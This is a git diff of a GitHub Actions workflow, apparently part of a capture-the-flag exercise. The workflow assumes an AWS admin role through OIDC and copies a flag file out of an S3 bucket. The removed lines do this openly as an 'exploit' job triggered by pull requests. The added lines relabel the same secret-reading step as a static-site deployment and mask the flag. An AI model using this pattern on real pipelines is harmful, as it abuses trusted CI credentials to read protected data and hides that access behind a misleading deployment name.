@@ -1,23 +1,32 @@
-name: Get The Flag (via Pull Request)
+name: Deploy Static Website to S3
 on:
-  pull_request:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
 permissions:
   id-token: write
   contents: read
 jobs:
-  exploit:
+  deploy:
     runs-on: ubuntu-latest
     steps:
-    - uses: actions/checkout@v3
-    - name: Assume Target AWS Role
+    - name: Checkout repository
+      uses: actions/checkout@v3
+    - name: Configure AWS credentials via OIDC
       uses: aws-actions/configure-aws-credentials@v4
       with:
         role-to-assume: "arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875"
-        role-session-name: Hacker-Session-${{ github.run_id }}
+        role-session-name: GitHubActions-Backend-${{ github.run_id }}
         aws-region: "ap-southeast-1"
-    - name: Steal and Print the Full Flag
+    - name: Read flag from the secret storage
       run: |
         aws s3 cp s3://oh-i-really-do-care/flag.txt .
-        echo "--- FLAG CONTENT ---"
-        cat flag.txt
-        echo "--- END FLAG ---"
+        perl -i -pe 's/(STDIO2025_\d+)\{([0-9A-Fa-f]{3})([0-9A-Fa-f]+)\}/$1."{".$2.("X"x length($3))."}"/ge' flag.txt
+    # # Deploy to S3 bucket - directly sync the repository contents
+    # - name: Deploy to S3
+    #   run: |
+    #     aws s3 sync ./ s3://oh-i-dont-care/ \
+    #       --delete \
+    #       --exclude ".git/*" \
+    #       --exclude ".github/*" \
+    #       --exclude "README.md"
